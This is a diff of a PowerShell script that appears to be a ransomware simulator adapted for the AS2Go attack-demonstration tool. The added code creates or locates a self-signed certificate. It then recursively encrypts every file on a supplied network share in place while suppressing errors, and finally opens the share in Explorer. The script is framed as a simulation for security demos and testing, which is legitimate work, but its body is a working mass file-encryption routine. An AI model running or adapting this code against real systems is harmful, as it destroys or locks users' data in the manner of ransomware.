@@ -16,32 +16,30 @@ http://msdn.microsoft.com/en-us/library/system.security.cryptography.x509certifi
 Provided by WatchPoint Data under the MIT license.
 
 https://de.wikipedia.org/wiki/MIT-Lizenz
-
-
 https://blog.getcryptostopper.com/ransomware-simulator-script
-
 https://docs.microsoft.com/en-us/azure/active-directory/develop/howto-create-self-signed-certificate
+
+
 
 $cert = New-SelfSignedCertificate -Subject "CN={certificateName}" -CertStoreLocation "Cert:\CurrentUser\My" -KeyExportPolicy Exportable -KeySpec Signature -KeyLength 2048 -KeyAlgorithm RSA -HashAlgorithm SHA256    ## Replace {certificateName}
 New-SelfSignedCertificate -Subject "CN={FileEncoder}" -CertStoreLocation "Cert:\CurrentUser\My" -KeyExportPolicy Exportable -KeySpec Signature -KeyLength 2048 -KeyAlgorithm RSA -HashAlgorithm SHA256    ## Replace {certificateName}
 Get-ChildItem Cert:\CurrentUser\My
 
 Set-MpPreference -EnableControlledFolderAccess Enabled
-
-
 New-SelfSignedCertificate -Subject "CN={AS2Go}" -CertStoreLocation "Cert:\LocalMachine\My" -KeyExportPolicy Exportable -KeySpec Signature -KeyLength 2048 -KeyAlgorithm RSA -HashAlgorithm SHA256    ## Replace {certificateName}
-
-
-
-Copy-Item "C:\Temp\AS2Go\*.*" -Destination "C:\temp\AS2Go\VI-HerrHoZi\"  -Exclude *.exe
-
 
 #>
 
 
-# parameter incl. default value 
-param([string] $share)
 
+# modified by hozimmer@microsoft to run this PoSH in combination with AS2Go
+# parameter incl. default value 
+
+#  .\AS2Go-encryption.ps1 -share '\\nuc-dc01\AD-Backup\DA-HerrHozi'
+
+
+
+param([string] $share)
 
 If ((Test-Path -Path $share -PathType Any) -eq $false)
     {
@@ -50,36 +48,36 @@ If ((Test-Path -Path $share -PathType Any) -eq $false)
     exit
     }
 
-#global variables
-#$csv = "C:\temp\AS2Go\drives.csv"
-
-#enumerate drives
-#$psdrives = get-psdrive | select-object -property Root, DisplayRoot
-
-#find network drives
-#$netdrives = @($psdrives)."DisplayRoot"
-
-#$f1 = "\\NUC-SANDBOX01\c$\#protected folder"
-#$f2 = "\\NUC-SANDBOX01\c$\#unprotected folder"
-#$f3 = "\\NUC-SANDBOX01\RansomwareDataRecovery"
-#$netdrives = @($f1,$f2,$f3)
-
-#$netdrives = @($share)
-
-$n = $share
-
-#export the drives to csv
-# $netdrives | export-csv -path C:\windows\temp\drives.csv -NoTypeInformation -Encoding ASCII -Force
 
 $encoderName = "AS2Go"
-$encoder = Get-ChildItem Cert:\Localmachine\My | Where Subject -eq "CN={$encoderName}"
 
-$hz =  $encoder.Thumbprint
+
+Get-ChildItem Cert:\Localmachine\My
+Write-Host "`n"
+
+
+$encoder   = Get-ChildItem Cert:\Localmachine\My | Where Subject -eq "CN={$encoderName}"
+$AS2GoCert = $encoder.Thumbprint
+
+if ($AS2GoCert)
+   {
+   #Write-Host "Use Cert Thumbprint for encryption: " $encoder.Thumbprint
+   }
+else
+   {
+   Write-Host "Create new SelfSignedCertificate  - $encoderName"
+   New-SelfSignedCertificate -Subject "CN={$encoderName}" -CertStoreLocation "Cert:\LocalMachine\My" -KeyExportPolicy Exportable -KeySpec Signature -KeyLength 2048 -KeyAlgorithm RSA -HashAlgorithm SHA256    ## Replace {certificateName}
+   $encoder = Get-ChildItem Cert:\Localmachine\My | Where Subject -eq "CN={$encoderName}"
+   $AS2GoCert = $encoder.Thumbprint
+   #Write-Host "Use Cert Thumbprint for encryption: " $encoder.Thumbprint
+   }
+
+
+
+Write-Host "`nUse Cert Thumbprint for encryption:  $AS2GoCert`n"
 #define the cert to use for encryption
-#$Cert = $(Get-ChildItem Cert:\CurrentUser\My\C83FDF986FF04A88073FE6E0DE9F13AB920972EA)
-$Cert = $(Get-ChildItem Cert:\LocalMachine\My\$hz)
-
-Write-Host "test"
+$Cert = $(Get-ChildItem Cert:\LocalMachine\My\$AS2GoCert)
+pause
 
 
 Function Encrypt-File
@@ -134,61 +132,18 @@ Function Encrypt-File
     copy-Item -Path $($env:temp+$FileToEncrypt.Name) -Destination $FileToEncrypt.FullName -Force
 }
 
+$FileToEncrypt = get-childitem -path $share -Recurse -force | where-object{!($_.PSIsContainter)} | % {$_.FullName} -ErrorAction SilentlyContinue  
+
+#logic to encrypt files
+foreach ($file in $FileToEncrypt)
+  {
+  Write-Host "Encrypting $file"
+  Encrypt-File $file $Cert -ErrorAction SilentlyContinue  
+  }
+
+#open the $share
+explorer $share
 
 
-        $FileToEncrypt = get-childitem -path $n -Recurse -force | where-object{!($_.PSIsContainter)} | % {$_.FullName} -ErrorAction SilentlyContinue  
-        #logic to encrypt files
-             foreach ($file in $FileToEncrypt)
-             {
-             Write-Host "Encrypting $file"
-             Encrypt-File $file $Cert -ErrorAction SilentlyContinue  
-             }
-
-<#
-
-#enumerate the network drives
-ForEach ($n in $netdrives)
-    {
-
-    If ($n)
-        {
-        #discover the files in the share and ignore directories.
-        $FileToEncrypt = get-childitem -path $n -Recurse -force | where-object{!($_.PSIsContainter)} | % {$_.FullName} -ErrorAction SilentlyContinue  
-        #logic to encrypt files
-             foreach ($file in $FileToEncrypt)
-             {
-             Write-Host "Encrypting $file"
-             Encrypt-File $file $Cert -ErrorAction SilentlyContinue  
-             }
-        
-        }
-        Else
-        {
-        Write-Host "File not accessible"
-        }
-    }
-
-
-    $encoderName = "AS2Go4"
-$encoder = Get-ChildItem Cert:\Localmachine\My | Where Subject -eq "CN={$encoderName}"
-#$encoder.Thumbprint  
-
-if ($encoder.Thumbprint)
-{
-Write-Host "found - " $encoder.Thumbprint
-}
-else
-{
-Write-Host "create new one  - $encoderName"
-New-SelfSignedCertificate -Subject "CN={$encoderName}" -CertStoreLocation "Cert:\LocalMachine\My" -KeyExportPolicy Exportable -KeySpec Signature -KeyLength 2048 -KeyAlgorithm RSA -HashAlgorithm SHA256    ## Replace {certificateName}
-$encoder = Get-ChildItem Cert:\Localmachine\My | Where Subject -eq "CN={$encoderName}"
-}
-
-Write-Host $encoder.Thumbprint 
-
-
-
-#encryption and filestream function
-#>
 
 Exit
